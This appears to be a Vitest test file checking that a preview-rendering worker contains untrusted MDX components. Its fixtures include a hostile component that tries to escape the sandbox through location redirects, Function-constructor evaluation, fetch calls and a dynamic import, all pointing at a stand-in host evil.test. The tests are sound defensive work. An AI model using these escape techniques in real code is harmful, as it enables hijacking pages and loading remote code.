// @vitest-environment node
import vm from "node:vm"
import { describe, expect, it } from "vitest"
import { createCompatibleWorkerSource, prepareCompatibleWorkerJob } from "../compatible-worker"

describe("compatible worker containment", () => {
  it("runs repository components without a DOM/navigation realm and returns only inert output", async () => {
    const job = await prepareCompatibleWorkerJob({
      artifactId: "artifact-hostile",
      documentSource: "<Escape />",
      adapter: {
        entryPath: "mdx-preview.tsx",
        sources: {
          "mdx-preview.tsx": `
            import React from "react"
            function Escape() {
              React.useEffect(() => { globalThis.location.href = "https://evil.test/effect" }, [])
              const constructor = (() => {}).constructor
              if (constructor) constructor("globalThis.location.href='https://evil.test/constructor'")()
              const asyncConstructor = Object.getPrototypeOf(async function () {}).constructor
              if (asyncConstructor) asyncConstructor("globalThis.location.href='https://evil.test/async-constructor'")()
              if (typeof postMessage === "function") postMessage({ type: "repopress:rendered-compatible" })
              if (typeof fetch === "function") fetch("https://evil.test/fetch")
              return <a
                href="https://evil.test/link"
                style={{ backgroundImage: "url(https://evil.test/style)" }}
                ref={() => { globalThis.location.href = "https://evil.test/ref" }}
              >Contained</a>
            }
            export default { components: { Escape } }
          `,
        },
      },
    })
    const sent: unknown[] = []
    const listeners: Array<(event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>> = []
    const workerLocation = { href: "blob:null/repopress-owned-worker" }
    const port = {
      closed: false,
      onmessage: null as ((event: { data: unknown }) => void) | null,
      close() {
        this.closed = true
      },
      postMessage(message: unknown) {
        sent.push(message)
      },
      start() {},
    }
    const context = vm.createContext({
      console,
      location: workerLocation,
      addEventListener: (
        type: string,
        listener: (event: { data?: unknown; ports?: unknown[] }) => void | Promise<void>,
      ) => {
        if (type === "message") listeners.push(listener)
      },
      removeEventListener: () => {},
    })
    vm.runInContext(createCompatibleWorkerSource(), context, { timeout: 1_000 })

    expect(listeners).toHaveLength(1)
    await listeners[0]({ ports: [port] })
    expect(port.onmessage).not.toBeNull()
    port.onmessage?.({
      data: {
        type: "repopress:render-compatible",
        requestId: "R".repeat(43),
        job,
      },
    })

    expect(workerLocation.href).toBe("blob:null/repopress-owned-worker")
    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({ type: "repopress:rendered-compatible", requestId: "R".repeat(43) })
    const serialized = JSON.stringify(sent[0])
    expect(serialized).toContain("Contained")
    expect(serialized).not.toMatch(/evil\.test|href|style|ref/)
  })

  it("rejects dynamic imports before any repository code reaches the worker", async () => {
    await expect(
      prepareCompatibleWorkerJob({
        artifactId: "artifact-import",
        documentSource: "# Safe",
        adapter: {
          entryPath: "mdx-preview.tsx",
          sources: {
            "mdx-preview.tsx": `
              const deferred = import("https://evil.test/module.js")
              export default { scope: { deferred } }
            `,
          },
        },
      }),
    ).rejects.toThrow("Dynamic imports are unavailable")
  })
})
